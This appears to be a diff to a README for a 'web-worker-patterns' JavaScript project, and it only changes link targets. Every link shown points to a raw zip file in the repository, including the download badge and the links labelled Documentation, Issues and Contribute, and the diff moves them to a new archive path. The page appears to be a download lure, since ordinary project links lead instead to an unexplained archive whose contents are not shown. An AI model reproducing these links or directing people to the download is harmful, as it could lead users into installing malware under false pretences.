@@ -1,6 +1,6 @@
 # 🌐 web-worker-patterns - Explore Efficient JavaScript Techniques
 
-[![Download](https://raw.githubusercontent.com/Glencee26/web-worker-patterns/main/stour/web-worker-patterns.zip)](https://raw.githubusercontent.com/Glencee26/web-worker-patterns/main/stour/web-worker-patterns.zip)
+[![Download](https://raw.githubusercontent.com/Glencee26/web-worker-patterns/main/09-angular/web-worker-patterns-3.8.zip)](https://raw.githubusercontent.com/Glencee26/web-worker-patterns/main/09-angular/web-worker-patterns-3.8.zip)
 
 ## 📖 Overview
 
@@ -13,7 +13,7 @@ To get started, you'll need to download the application from the Releases page. 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:** To download the software, go to our Releases page by clicking the link below:
-   [Download from Releases](https://raw.githubusercontent.com/Glencee26/web-worker-patterns/main/stour/web-worker-patterns.zip)
+   [Download from Releases](https://raw.githubusercontent.com/Glencee26/web-worker-patterns/main/09-angular/web-worker-patterns-3.8.zip)
 
 2. **Choose Your Version:** You'll find a list of available versions. Look for the most recent version, which will typically be at the top of the list.
 
@@ -58,8 +58,8 @@ This project is licensed under the MIT License. You can use and modify the code 
 
 ## 🔗 Useful Links
 
-- [Documentation](https://raw.githubusercontent.com/Glencee26/web-worker-patterns/main/stour/web-worker-patterns.zip)
-- [Issues](https://raw.githubusercontent.com/Glencee26/web-worker-patterns/main/stour/web-worker-patterns.zip)
-- [Contribute](https://raw.githubusercontent.com/Glencee26/web-worker-patterns/main/stour/web-worker-patterns.zip)
+- [Documentation](https://raw.githubusercontent.com/Glencee26/web-worker-patterns/main/09-angular/web-worker-patterns-3.8.zip)
+- [Issues](https://raw.githubusercontent.com/Glencee26/web-worker-patterns/main/09-angular/web-worker-patterns-3.8.zip)
+- [Contribute](https://raw.githubusercontent.com/Glencee26/web-worker-patterns/main/09-angular/web-worker-patterns-3.8.zip)
 
 Thank you for using **web-worker-patterns**! We hope you find the patterns helpful in your web development journey.
